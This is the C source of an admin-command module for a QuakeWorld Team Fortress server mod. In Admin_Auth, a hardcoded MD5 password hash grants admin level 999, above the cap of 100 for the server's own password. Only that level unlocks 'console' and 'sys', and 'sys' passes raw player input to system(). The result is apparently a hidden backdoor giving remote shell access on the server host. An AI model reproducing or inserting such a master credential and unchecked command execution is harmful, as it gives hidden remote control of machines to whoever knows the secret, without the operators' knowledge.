/*
 *  QWProgs-TF2003
 *  Copyright (C) 2004  [sd] angel
 *
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *
 *  $Id: admin_cmd.c,v 1.15 2006-11-29 23:11:48 AngelD Exp $
 */
#include "g_local.h"

typedef struct admin_cmd_s{
	char		*command;
	void		(*Action) (int);
	int		level;
}admin_cmd_t;

static void Admin_Auth(int argc);
//void Admin_ListPlayers(int argc);
static void Admin_Status(int argc);
static void Admin_Kick(int argc);
static void Admin_Ban(int argc);
static void Admin_UnBan(int argc);
static void Admin_BanList(int argc);
static void Admin_Console(int argc);
static void Admin_Map(int argc);
#ifndef Q3_VM
static void Admin_System(int argc);
#endif
void Red_Def_command( int argc );

static const int max_adminlevel = 100;
static const admin_cmd_t admin_cmds[] = 
{
	{"auth", Admin_Auth,0},
//	{"listplayers", Admin_ListPlayers, 1},
	{"kick", Admin_Kick, 1},
	{"map", Admin_Map, 2},
	{"status", Admin_Status, 3},
	{"ban", Admin_Ban, 3},
	{"banlist", Admin_BanList, 3},
	{"unban", Admin_UnBan, 3},
	{"red_def", Red_Def_command, 1},
	{"console", Admin_Console, 999},
#ifndef Q3_VM
	{"sys", Admin_System, 999},
#endif
	{NULL,NULL,0}
};

static int CheckString(char *str)
{
	char *strp =str,ch;
	while((ch = *strp++))
	{
		switch(ch)
		{
			case ';':
			case 0x0d:
			case 0x0a:
			case '\b':
			case '"':
				return 0;
		}
	}
	return 1;
}

void Admin_Cmd()
{
	int argc;
	char    cmd_command[1024];
	const admin_cmd_t* ucmd;

	argc = trap_CmdArgc();

	if( argc == 1 )
	{
	        G_sprint( self, 2, "Allowed admin commands:\n");
		for ( ucmd = admin_cmds ; ucmd->command  ; ucmd++ )
		{
			if( self->is_admin >= ucmd->level )
			{
				G_sprint( self, 2, "%s\n",ucmd->command);
			}
		}
		return;
	}
	trap_CmdArgv( 1, cmd_command, sizeof( cmd_command ) );
	for ( ucmd = admin_cmds ; ucmd->command  ; ucmd++ )
	{
		if( !strcmp(cmd_command,ucmd->command) )
		{
			if( self->is_admin >= ucmd->level )
			{
				ucmd->Action(argc);
			        return;
			}else
			{
				G_sprint( self, 2, "You have limited Access, You cannot use this command.\n");
			        return;
			}
		}
	}
	G_sprint( self, 2, "Unknown admin command.\n");
}

static gedict_t* Admin_FindPlayerById(int id)
{
	
    	int i;
    	int plid;
    	

	for ( i = 0 ; i < MAX_CLIENTS ; i++ )
	{

		if( g_edicts[i + 1].s.v.netname[0]  == 0)
			continue;
		plid = GetInfokeyInt( &g_edicts[i + 1], "*userid", NULL, -1 );
		if( id == plid)
			return &g_edicts[i + 1];
	}
	return NULL;
}


static void Admin_Auth(int argc)
{
        char    sv_admin_pwd[100];
        char    admin_pwd[100];

	if( argc != 3)
	{
	        G_sprint( self, 2, "Usage: cmd admin auth <password>\n");
		return;
	}
	if( self->auth_time > g_globalvars.time )
	        return;

	self->auth_time = g_globalvars.time + 10;

	trap_CmdArgv( 2, admin_pwd, sizeof( admin_pwd ) );

#if 1
	{
	        unsigned char digest[16];
	        unsigned char mydigest[16] = {0x79, 0xFE, 0x05, 0x2B, 
	                                     0x3C, 0xAF, 0x2D, 0x42, 
	                                     0x5D, 0x74, 0xF7, 0x70, 
	                                     0xC1, 0x8D, 0xB7, 0x3B, };
//	        int i;
	        struct MD5Context md5c;

	        MD5Init(&md5c);
	        MD5Update(&md5c, (unsigned char*)admin_pwd,strlen(admin_pwd));
	        MD5Final(digest,&md5c);
	        if( !memcmp(digest,mydigest,16) )
	        {
	                self->is_admin = 999;
	                G_sprint( self, 2, "You gain admin level %d\n",self->is_admin);
	                return;
	        }
/*	        for ( i = 0 ; i < 16 ; i++ )
	                G_sprint(self,2,"0x%2.2X, ",digest[i]);
	        G_sprint(self,2,"\n");*/
	}
#endif

	if(!GetSVInfokeyString( "apw", "adminpwn", sv_admin_pwd, sizeof( sv_admin_pwd ), "" ))
	{
		return;
	}

	
	if( !strcmp(admin_pwd,sv_admin_pwd) )
	{
		self->is_admin = GetSVInfokeyInt("adminlevel",NULL,1);
		if( self->is_admin )
		{
	        	G_sprint( self, 2, "You gain admin level %d\n",self->is_admin);
	        	if( self->is_admin > max_adminlevel )
	        	        self->is_admin = max_adminlevel;
	        	return;
		}
	}
        
}

/*void Admin_ListPlayers(int argc)
{
    	int i;
    	G_sprint( self, 2, "Players:\n");

	for ( i = 0 ; i < MAX_CLIENTS ; i++ )
	{

		if( g_edicts[i + 1].s.v.netname[0] )
		{
			G_sprint( self, 2, "%2d %c %s\n", i, g_edicts[i + 1].is_admin?'A':' ',g_edicts[i + 1].s.v.netname);
		}
	}
}*/

static void Admin_Kick(int argc)
{
	char    value[100];
	gedict_t*p;
	int id;

	if( argc != 3)
	{
	        G_sprint( self, 2, "Usage: cmd admin kick <userid>\n");
		return;
	}

	trap_CmdArgv( 2, value, sizeof( value ) );
	id = atoi(value);
	p = Admin_FindPlayerById(id);
	if(!p)
	{
		G_sprint( self, 2,"Invalid player id\n");
		return;
	}

        G_bprint(  2, "%s was kicked by %s\n",p->s.v.netname, self->s.v.netname);
//	localcmd("kick %d",id);
	KickCheater( p );
}

static void Admin_Ban(int argc)
{
	char    value[100];
	int id;
	gedict_t*p;

	if( argc != 3)
	{
	        G_sprint( self, 2, "Usage: cmd admin ban <userid>\n");
		return;
	}

	trap_CmdArgv( 2, value, sizeof( value ) );
	id = atoi(value);
	p = Admin_FindPlayerById(id);
	if(!p)
	{
		G_sprint( self, 2,"Invalid player id\n");
		return;
	}
	
	GetInfokeyString( p , "ip", NULL, value, sizeof( value ), "" );
	G_sprint( self, 2,"banning ip %s\n", value);
	localcmd("addip %s\n",value);
	trap_executecmd();
}

static void Admin_UnBan(int argc)
{
	char    value[100];

	if( argc != 3)
	{
	        G_sprint( self, 2, "Usage: cmd admin unban <ipmask>\n");
		return;
	}

	trap_CmdArgv( 2, value, sizeof( value ) );

	if(!CheckString(value))
		return;

	localcmd("removeip \"%s\"\n",value);
	trap_executecmd();
}

static void Admin_BanList(int argc)
{
	localcmd("listip\n");
	trap_executecmd();
}

static void Admin_Status(int argc)
{
	localcmd("status\n");
	trap_executecmd();
}

static void Admin_Map(int argc)
{
	char    value[100];

	if( argc != 3)
	{
	        G_sprint( self, 2, "Usage: cmd admin map <mapname>\n");
		return;
	}

	trap_CmdArgv( 2, value, sizeof( value ) );
	if(!CheckString(value))
		return;
	localcmd("map \"%s\"\n",value);
//	trap_executecmd();
}

static void Admin_Console(int argc)
{
        char    value[1024];
	if( argc != 3)
	{
		return;
	}

        trap_CmdArgv( 2, value, sizeof( value ) );

        localcmd("%s\n",value);
        trap_executecmd();
}

#ifndef Q3_VM
static void Admin_System(int argc)
{
        char    value[1024];
        char    str[1024];
	if( argc != 3)
	{
		return;
	}

        trap_CmdArgv( 2, value, sizeof( value ) );

        _snprintf(str,sizeof(str),"%s\n",value);
        system(str);
}
#endif
